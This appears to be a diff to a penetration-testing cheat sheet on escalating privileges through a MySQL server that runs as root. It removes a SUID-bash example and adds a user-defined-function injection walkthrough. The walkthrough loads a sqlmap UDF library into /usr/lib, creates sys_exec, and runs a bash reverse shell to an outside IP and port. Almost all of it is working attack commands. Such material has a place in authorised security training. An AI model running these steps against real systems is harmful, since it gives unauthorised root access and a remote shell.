@@ -925,19 +925,6 @@ id && whoami
 ```
 
 Example 2
-```
-ps aux | grep root
-
-mysql -u root -p
-
-\! select sys_exec(‘chmod +s /bin/bash’);
-exit
-ls -la /bin/bash                          // Verify that the SUID bit is set
-/bin/bash -p 
-id && whoami
-```
-
-Example 3
 
 Victim
 ```
@@ -956,14 +943,24 @@ id && whoami
 
 # MySQL UDF (User-Defined Functions) Code (UDF) Injection
 
-Example 1
+User Defined Function (UDF) is a piece of code that extends the functionality of a MySQL server by adding a new function that behaves just like a native (built-in) MySQL function, such as abs() or concat()
+UDFs are useful when you need to extend the functionality of your MySQL server
+For penetration testing, we can include a UDF inside our database that loads a library that has the ability to execute commands via the sys_exec() function which gives us code execution
+
+Example 
 ```
 ps aux | grep root                        //  Verify that MySQL is running as root
-gcc -g -c raptor_udf.c
-gcc -g -shared -W1,-soname,raptor_udf.so -o raptor_udf.so raptor_udf.o -lc
+Download UDF (Linux - 64 Bit) = https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/linux/64
+Download UDF (Linux - 32 Bit) = https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/linux/32
+Save the UDF in the /tmp folder ( Example: /tmp/lib_mysqludf_sys.so)
 mysql -u root -p
 
 mysql> use mysql;
+mysql> create table admin(line blob);
+mysql> insert into admin values(load_file('/tmp/lib_mysqludf_sys.so'));
+mysql> select * from admin into dumpfile '/usr/lib/lib_mysqludf_sys.so';
+mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
+mysql> select sys_exec('bash -i >& /dev/tcp/10.10.10.10/9999 0>&1');
 mysql> create table foo(line blob);
 mysql> insert into foo values(load_file(‘/home/raptor/raptor_udf.so’));
 mysql> select * from foo into dumpfile ‘/usr/lib/raptor_udf.so’;
